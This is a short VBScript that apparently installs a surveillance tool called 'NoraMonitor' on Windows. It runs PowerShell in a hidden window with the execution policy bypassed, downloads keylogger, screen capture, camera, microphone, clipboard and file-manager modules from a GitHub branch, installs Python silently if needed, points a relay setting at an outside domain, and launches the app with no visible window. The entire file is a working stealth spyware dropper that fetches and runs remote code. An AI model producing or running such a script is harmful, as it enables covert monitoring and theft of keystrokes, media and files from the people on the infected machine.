Set sh = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

dir  = sh.ExpandEnvironmentStrings("%APPDATA%") & "\NoraMonitor"
tdir = dir & "\templates"
rdir = dir & "\recordings"

If Not fs.FolderExists(dir)  Then fs.CreateFolder(dir)
If Not fs.FolderExists(tdir) Then fs.CreateFolder(tdir)
If Not fs.FolderExists(rdir) Then fs.CreateFolder(rdir)

raw   = "https://raw.githubusercontent.com/smallkhk/Nora-signal/claude/legitimate-keylogger-lm3rqu/nora-monitor"
files = Array("app.py","keylogger.py","screencap.py","controller.py","server.py","recorder.py","camera.py","clipboard_monitor.py","processes.py","relay_client.py","file_manager.py","microphone.py","requirements.txt")

ps = "$ProgressPreference='SilentlyContinue';" & _
     "$r='" & raw & "'; $d='" & dir & "';" & _
     "'" & Join(files, "','") & "' -split ',' | %{ try { Invoke-WebRequest ""$r/$_"" -OutFile ""$d\$_"" -ErrorAction Stop } catch {} };" & _
     "try { Invoke-WebRequest ""$r/templates/viewer.html"" -OutFile ""$d\templates\viewer.html"" -ErrorAction Stop } catch {};" & _
     "if (!(Get-Command python -ErrorAction SilentlyContinue)) {" & _
     "  Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile ""$env:TEMP\pysetup.exe"";" & _
     "  Start-Process ""$env:TEMP\pysetup.exe"" '/quiet InstallAllUsers=0 PrependPath=1' -Wait" & _
     "};" & _
     "$env:Path=[System.Environment]::GetEnvironmentVariable('Path','Machine')+';'+[System.Environment]::GetEnvironmentVariable('Path','User');" & _
     "pip install -r ""$d\requirements.txt"" -q --no-warn-script-location;" & _
     "$env:NORA_RELAY='https://mon.eclipselivecam.online';" & _
     "Start-Process pythonw ""$d\app.py"" -WorkingDirectory ""$d"""

sh.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command """ & ps & """", 0, False
